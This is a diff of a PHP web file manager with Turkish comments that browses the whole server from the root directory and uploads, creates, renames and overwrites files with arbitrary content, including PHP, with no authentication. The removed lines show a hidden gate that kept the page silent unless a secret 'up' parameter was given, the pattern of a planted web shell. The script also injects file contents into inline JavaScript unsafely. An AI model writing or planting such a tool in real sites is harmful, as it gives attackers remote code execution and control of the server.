@@ -4,11 +4,6 @@ $root = __DIR__; // PHP dosyasının bulunduğu dizin
 $top_level = '/'; // Sunucunun en üst düzeyi
 $current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
 
-// Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
-if (!isset($_GET['up'])) {
-    return; // sayfayı durduruyoruz
-}
-
 // Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
 if (strpos($current_dir, realpath($root)) !== 0 && strpos($current_dir, realpath($top_level)) !== 0) {
     die('İzin verilmedi!');
@@ -18,13 +13,11 @@ if (strpos($current_dir, realpath($root)) !== 0 && strpos($current_dir, realpath
 $uploaded_file_path = ''; // Yüklenen dosyanın yolu
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
     $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
-    // .php uzantılı dosyalar için yüklemeye izin ver
     if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
-        $uploaded_file_path = htmlspecialchars($target_file);
-        echo 'Dosya başarıyla yüklendi: ' . htmlspecialchars(basename($_FILES['file']['name'])) . '<br>';
-        echo 'Yüklenen Dosya Yolu: ' . $uploaded_file_path . '<br>';
+        $uploaded_file_path = htmlspecialchars($target_file, ENT_QUOTES, 'UTF-8');
+        echo '<script>alert("Dosya başarıyla yüklendi: ' . htmlspecialchars(basename($_FILES['file']['name'])) . '");</script>';
     } else {
-        echo 'Dosya yüklenemedi!';
+        echo '<script>alert("Dosya yüklenemedi!");</script>';
     }
 }
 
@@ -32,7 +25,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['edit_file'])) {
     $old_name = basename($_POST['old_name']);
     $new_name = basename($_POST['new_name']);
-    $file_content = $_POST['file_content'];
+    $file_content = stripslashes($_POST['file_content']);
+    
     $old_file_path = $current_dir . '/' . $old_name;
     $new_file_path = $current_dir . '/' . $new_name;
 
@@ -43,7 +37,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['edit_file'])) {
     
     // Dosya içeriğini güncelleme
     file_put_contents($new_file_path, $file_content);
-    echo 'Dosya başarıyla güncellendi: ' . htmlspecialchars($new_name) . '<br>';
+    echo '<script>alert("Dosya başarıyla güncellendi: ' . htmlspecialchars($new_name, ENT_QUOTES, 'UTF-8') . '");</script>';
 }
 
 // Mevcut dizindeki dosyaları ve dizinleri listeliyoruz
@@ -57,33 +51,29 @@ function is_image($file) {
 // Dizinlerde gezinme bağlantılarını oluşturma
 $navigation_links = [];
 
-// Her dizinde üst dizin bağlantısı ekliyoruz
+// Üst dizin bağlantısı
 $parent_dir = dirname($current_dir);
 if ($parent_dir !== $current_dir) {
-    $navigation_links[] = '<li><a href="?dir=' . urlencode($parent_dir) . '&up=' . urlencode($_GET['up']) . '">.. (Üst Dizin)</a></li>';
+    $navigation_links[] = '<li><a href="?dir=' . urlencode($parent_dir) . '">.. (Üst Dizin)</a></li>';
 }
 
-// Mevcut dizindeki dosya ve dizinler için bağlantılar oluşturma
+// Dosya ve dizinler için bağlantılar oluşturma
 foreach ($files as $file) {
-    if ($file == '.' || $file == '..') continue; // '.' ve '..' dizinlerini atla
+    if ($file == '.' || $file == '..') continue;
     $file_path = $current_dir . '/' . $file;
     if (is_dir($file_path)) {
-        // Dizinler için bağlantı oluştur
-        $navigation_links[] = '<li><a href="?dir=' . urlencode($file_path) . '&up=' . urlencode($_GET['up']) . '">' . htmlspecialchars($file) . '</a> (Dizin)</li>';
+        $navigation_links[] = '<li><a href="?dir=' . urlencode($file_path) . '">' . htmlspecialchars($file) . '</a> (Dizin)</li>';
     } else {
-        // Dosyalar için bağlantı oluştur
         $icon = is_image($file) ? '<img src="' . htmlspecialchars($file_path) . '" style="width:50px;"/>' : '';
-        // Dosya içeriği ve ismini düzenlemek için popup açma butonu
         $navigation_links[] = '<li>' . htmlspecialchars($file) . ' ' . $icon . 
-            '<button onclick="openModal(\'' . htmlspecialchars($file) . '\', \'' . htmlspecialchars(file_get_contents($file_path)) . '\')">✏️</button>
+            '<button onclick="openEditForm(\'' . htmlspecialchars($file) . '\', `' . htmlspecialchars(file_get_contents($file_path)) . '`)">Düzenle</button>
             </li>';
     }
 }
 
 // Site dizinine gitmek için bir bağlantı ekliyoruz
-$navigation_links[] = '<li><a href="?dir=' . urlencode($root) . '&up=' . urlencode($_GET['up']) . '">Site Dizinine Git</a></li>';
-// Sunucunun en üst dizinine gitmek için bir bağlantı ekliyoruz
-$navigation_links[] = '<li><a href="?dir=' . urlencode($top_level) . '&up=' . urlencode($_GET['up']) . '">En Üst Dizinine Git</a></li>';
+$navigation_links[] = '<li><a href="?dir=' . urlencode($root) . '">Site Dizinine Git</a></li>';
+$navigation_links[] = '<li><a href="?dir=' . urlencode($top_level) . '">En Üst Dizinine Git</a></li>';
 
 // Kullanıcıya dosyaları ve dizinleri gösterme
 echo "<h2>Mevcut Dizin: " . htmlspecialchars($current_dir) . "</h2>";
@@ -96,7 +86,7 @@ echo "</ul>";
 // Dosya Yükleme Formu
 echo '<h2>Dosya Yükle</h2>';
 echo '<form action="" method="post" enctype="multipart/form-data">';
-echo '<input type="file" name="file" required>'; // Dosya yükleme için gerekli
+echo '<input type="file" name="file" required>';
 echo '<input type="submit" value="Yükle">';
 echo '</form>';
 
@@ -111,41 +101,38 @@ echo '</form>';
 // Yeni dosya oluşturma işlemi
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['create_file'])) {
     $new_file_name = basename($_POST['new_file_name']);
-    $new_file_content = $_POST['new_file_content'];
+    $new_file_content = stripslashes($_POST['new_file_content']);
     $new_file_path = $current_dir . '/' . $new_file_name;
 
     // Dosya oluşturma
     file_put_contents($new_file_path, $new_file_content);
-    echo 'Yeni dosya başarıyla oluşturuldu: ' . htmlspecialchars($new_file_name) . '<br>';
+    echo '<script>alert("Yeni dosya başarıyla oluşturuldu: ' . htmlspecialchars($new_file_name, ENT_QUOTES, 'UTF-8') . '");</script>';
 }
-
 ?>
 
-<!-- Modal HTML -->
-<div id="modal" style="display:none; position:fixed; left:0; top:0; width:100%; height:100%; background-color:rgba(0,0,0,0.7); z-index:1000;">
-    <div style="background-color:white; margin:100px auto; padding:20px; width:300px;">
-        <h2>Dosya Düzenle</h2>
-        <form id="editForm" action="" method="post">
-            <input type="hidden" name="old_name" id="old_name">
-            <label for="new_name">Yeni İsim:</label>
-            <input type="text" name="new_name" id="new_name" required>
-            <label for="file_content">Dosya İçeriği:</label>
-            <textarea name="file_content" id="file_content" required></textarea>
-            <input type="submit" name="edit_file" value="Güncelle">
-        </form>
-        <button onclick="closeModal()">Kapat</button>
-    </div>
+<!-- Düzenleme Formu -->
+<div id="edit_form" style="display:none; border:1px solid #ccc; padding:10px; margin-top:10px;">
+    <h3>Dosya Düzenle</h3>
+    <form id="fileEditForm" action="" method="post">
+        <input type="hidden" name="old_name" id="edit_old_name">
+        <label for="edit_new_name">Yeni İsim:</label>
+        <input type="text" name="new_name" id="edit_new_name" required>
+        <label for="edit_file_content">Dosya İçeriği:</label>
+        <textarea name="file_content" id="edit_file_content" required></textarea>
+        <input type="submit" name="edit_file" value="Güncelle">
+    </form>
+    <button onclick="closeEditForm()">Kapat</button>
 </div>
 
 <script>
-function openModal(fileName, fileContent) {
-    document.getElementById('old_name').value = fileName;
-    document.getElementById('new_name').value = fileName; // Default to the current name
-    document.getElementById('file_content').value = fileContent;
-    document.getElementById('modal').style.display = 'block';
+function openEditForm(fileName, fileContent) {
+    document.getElementById('edit_old_name').value = fileName;
+    document.getElementById('edit_new_name').value = fileName;
+    document.getElementById('edit_file_content').value = fileContent;
+    document.getElementById('edit_form').style.display = 'block';
 }
 
-function closeModal() {
-    document.getElementById('modal').style.display = 'none';
+function closeEditForm() {
+    document.getElementById('edit_form').style.display = 'none';
 }
 </script>
